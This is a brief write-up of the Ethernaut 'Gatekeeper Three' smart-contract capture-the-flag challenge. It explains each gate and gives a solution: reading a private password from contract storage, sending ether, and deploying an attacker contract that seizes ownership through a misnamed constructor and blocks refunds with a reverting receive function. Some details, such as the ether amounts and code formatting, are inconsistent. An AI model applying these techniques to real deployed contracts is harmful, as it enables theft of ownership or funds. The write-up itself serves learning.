#GATEKEEPER THREE
##Objective : 
to handle gates and become an entrant.

##analysis: 

Gate01:
set another contract as the owner and we will be tx.origin.

Gate02:
input right passwd as the argument of getAllowance()
it goes through trick.checkPassword().

Gate03:
The balance of the current contract (address(this)) must be greater than 0.001 ether.
Sending 0.001 ether to the owner of the contract

##solution: 
use createTrick() to get deploy a new SimpleTrick contract
get the password back by the web3js getStorageAt function
Since trick (blue button) is a public variable, it can be called using a getter function.

```await web3.eth.getStorageAt(“addr”, 2, console.log)
```
Run the getAllowance function with the hex number 

```await web3.eth.sendTransaction(
{from: player, to: “YOUR_INSTANCE_ADDRESS”, 
value: 10000000000000000}
)
contract solution {
    GatekeeperThree public target;
    address public owner;

    constructor(address _target) {
      target = GatekeeperThree(payable(_target));
      target.construct0r();
    }


   function solve() public returns (bool entered){
     entered = target.enter();
   }

    receive () external payable {
     revert(); 
   }
}

```
